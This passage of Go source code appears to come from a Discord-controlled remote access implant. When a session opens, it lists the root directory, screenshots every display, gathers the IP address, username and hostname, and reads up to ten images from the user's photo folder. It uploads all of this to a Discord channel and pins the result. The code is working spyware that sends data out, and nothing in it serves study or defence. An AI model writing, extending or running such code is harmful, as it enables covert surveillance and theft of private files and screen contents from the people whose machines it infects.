		lsOutput, lsErr = exec.Command("cmd", "/C", "dir", "C:\\").Output()
		if lsErr == nil && len(lsOutput) > 1987 {
			f, _ := os.CreateTemp(getTmpDir(), "ls_*.txt")
			f.Write(lsOutput)
			lsFile = f.Name()
			f.Close()
		}
	} else {
		lsOutput, lsErr = exec.Command("ls", "-alh", "/").Output()
		if lsErr == nil && len(lsOutput) > 1987 {
			f, _ := os.CreateTemp(getTmpDir(), "ls_*.txt")
			f.Write(lsOutput)
			lsFile = f.Name()
			f.Close()
		}
	}

	// Take screenshots for all displays
	var screenshotFiles []string
	if runtime.GOOS != "windows" || true { // Try on all OSes
		n := screenshot.NumActiveDisplays()
		for i := 0; i < n; i++ {
			bounds := screenshot.GetDisplayBounds(i)
			img, err := screenshot.CaptureRect(bounds)
			if err != nil {
				continue
			}
			fileName := fmt.Sprintf("%sfirstmsg_%d_%dx%d.png", getTmpDir(), i, bounds.Dx(), bounds.Dy())
			file, err := os.Create(fileName)
			if err != nil {
				continue
			}
			png.Encode(file, img)
			file.Close()
			screenshotFiles = append(screenshotFiles, fileName)
		}
	}

	firstMsg := fmt.Sprintf("Session *%s* opened! 🥳\n\n**IP**: %s\n**User**: %s\n**Hostname**: %s\n**OS**: %s\n**CWD**: %s", sessionId, localAddr.IP, currentUser.Username, hostname, runtime.GOOS, cwd)
	if psErr == nil && len(psOutput) <= 1987 {
		firstMsg += "\n\n**ps aux:**\n```" + string(psOutput) + "```"
	} else if psFile != "" {
		firstMsg += "\n\n(ps aux output attached as file)"
	}

	if lsErr == nil && len(lsOutput) <= 1987 {
		if runtime.GOOS == "windows" {
			firstMsg += "\n\n**dir C:\\:**\n```" + string(lsOutput) + "```"
		} else {
			firstMsg += "\n\n**ls /**:**\n```" + string(lsOutput) + "```"
		}
	} else if lsFile != "" {
		if runtime.GOOS == "windows" {
			firstMsg += "\n\n(dir C:\\ output attached as file)"
		} else {
			firstMsg += "\n\n(ls / output attached as file)"
		}
	}

	// Attach images from OS-specific photo directory
	var photoDir string
	if runtime.GOOS == "windows" {
		photoDir = "C:\\Users\\potato\\Pictures"
	} else {
		photoDir = "/home/d4rk_katt/photo"
	}
	imageExts := map[string]bool{".jpg":true, ".jpeg":true, ".png":true, ".gif":true, ".bmp":true}
	photoFiles := []string{}
	if stat, err := os.Stat(photoDir); err == nil && stat.IsDir() {
		entries, err := os.ReadDir(photoDir)
		if err == nil {
			for _, entry := range entries {
				if entry.IsDir() { continue }
				ext := strings.ToLower(filepath.Ext(entry.Name()))
				if imageExts[ext] {
					photoFiles = append(photoFiles, filepath.Join(photoDir, entry.Name()))
				}
			}
		}
	}
	maxPhotos := 10
	if len(photoFiles) > maxPhotos {
		firstMsg += "\n\n(Only first 10 images from " + photoDir + " are attached)"
		photoFiles = photoFiles[:maxPhotos]
	}
	var files []*discordgo.File
	for _, pfile := range photoFiles {
		f, _ := os.Open(pfile)
		defer f.Close()
		files = append(files, &discordgo.File{Name: filepath.Base(pfile), Reader: f})
	}

	msgSend := &discordgo.MessageSend{
		Content: firstMsg,
	}

	if psFile != "" {
		f, _ := os.Open(psFile)
		defer f.Close()
		files = append(files, &discordgo.File{Name: "ps.txt", Reader: f})
	}
	for _, sfile := range screenshotFiles {
		f, _ := os.Open(sfile)
		defer f.Close()
		files = append(files, &discordgo.File{Name: filepath.Base(sfile), Reader: f})
	}
	if lsFile != "" {
		f, _ := os.Open(lsFile)
		defer f.Close()
		files = append(files, &discordgo.File{Name: "ls.txt", Reader: f})
	}
	if len(files) > 0 {
		msgSend.Files = files
	}

	m, _ := dg.ChannelMessageSendComplex(myChannelId, msgSend)
	dg.ChannelMessagePin(myChannelId, m.ID)

	sc := make(chan os.Signal, 1)
	signal.Notify(sc, syscall.SIGINT, syscall.SIGTERM, os.Interrupt, os.Kill)
	<-sc

	dg.Close()
}
